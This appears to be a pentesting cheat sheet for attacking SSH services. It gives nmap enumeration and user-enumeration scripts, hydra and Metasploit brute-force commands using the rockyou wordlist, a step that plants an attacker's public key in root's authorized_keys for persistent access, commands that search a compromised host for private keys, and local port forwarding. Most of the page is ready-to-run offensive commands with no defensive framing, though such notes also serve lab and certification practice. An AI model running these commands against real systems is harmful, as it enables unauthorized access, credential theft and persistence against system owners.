```table-of-contents
```

!!! tip "Start here"
    Enumerate supported auth methods: `ssh -v user@<target>` — look for `publickey,password` vs `publickey` only. If password auth is enabled and you have a username, it's bruteforceable. Check for weak keys: `ssh-audit <target>`.

## Enumeration
### Banner Grabbing
```bash
nmap -p22 -sV --script=ssh-hostkey,ssh-auth-methods,ssh2-enum-algos $IP
```

### Example
Some older versions of OpenSSH allow timing-based user enumeration:
```bash
nmap --script ssh-user-enum -p22 --script-args userdb=users.txt $IP
```

## Brute-Force Credentials
```bash
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP
```

Metasploit:
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $IP
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

## Exploiting Misconfigurations
### Uploading `id_rsa.pub` onto Target for SSH Access
If the target allows, you might be able to add your public key to the `.ssh/authorized_keys` to allow you SSH access.

First, you need to write your public key to the target's `authorized_keys`.
```bash
kali $ cat /home/taylor/.ssh/id_rsa.pub
ssh-ed25-- SNIPPET --r3pCGS taylor@kali
```

Copy the key and use it in the following way on the target.
```bash
echo "ssh-ed25-- SNIPPET --r3pCGS taylor@kali" > /home/root/.ssh/authorized_keys
```

* You can do this with limited shell access or if you find a vulnerability which allows you to write files to the target
* You may need to `mkdir /home/user/.ssh/` before executing the command

After the file has been created, we just need to use the `id_rsa` from kali to SSH onto the target.
```bash
ssh -i /home/taylor/.ssh/id_rsa user@$IP
```

### Identifying Keys
```bash
grep -rnw "./" -e "PRIVATE KEY"
```

or

```bash
find / -name id_rsa -type f 2>/dev/null
```

If you gain access to the target, look for private keys in:

- **`/home/user/.ssh/id_rsa`**
- **`/root/.ssh/id_rsa`**
- **Git repositories (`.git/config`)**
- **Configuration backups (`.bak`, `.old`, `.tar`)**

If a private key is found:
```bash
chmod 600 id_rsa
ssh -i id_rsa user@$IP
```

## Tunneling & Port Forwarding
If you want to forward an internal service (e.g., MySQL on 3306) to your local machine:
```bash
ssh -L 3306:localhost:3306 user@$IP
```

**Note:** Ligolo-ng is another option to completely forward the network.